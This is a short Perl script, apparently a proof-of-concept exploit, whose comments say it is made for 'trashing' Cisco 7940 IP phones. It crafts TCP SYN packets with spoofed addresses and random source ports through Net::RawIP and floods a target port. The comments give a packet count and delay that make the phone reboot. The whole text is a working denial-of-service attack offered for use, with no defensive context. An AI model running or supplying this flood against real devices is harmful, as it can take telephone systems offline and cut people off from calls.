s is made for trashing cisco 7940 ip phones. kokanin made/discovered this.
# A packetcount of 1000 and a packetdelay of 0.002 sent to port 80 makes my 
# phone reboot - play with the settings and stuff. PRIVATE PRIVATE PRIVATE!!!
use Net::RawIP;
use Time::HiRes;
$pkt = new Net::RawIP;
die "Usage $0 <src> <dst> <target port> <number of pkts> <packet delay>" unless ($ARGV[4]);
$pkt->set({
        ip => {
                saddr => $ARGV[0],
                daddr => $ARGV[1] 
                },
        tcp=> { dest => $ARGV[2],
                syn => 1,
                seq => 0,
                ack => 0}
        });
for(1..$ARGV[3]){ $pkt->set({tcp=>{source=>int(rand(65535))}});Time::HiRes::sleep($ARGV[4]); $pkt->send; };


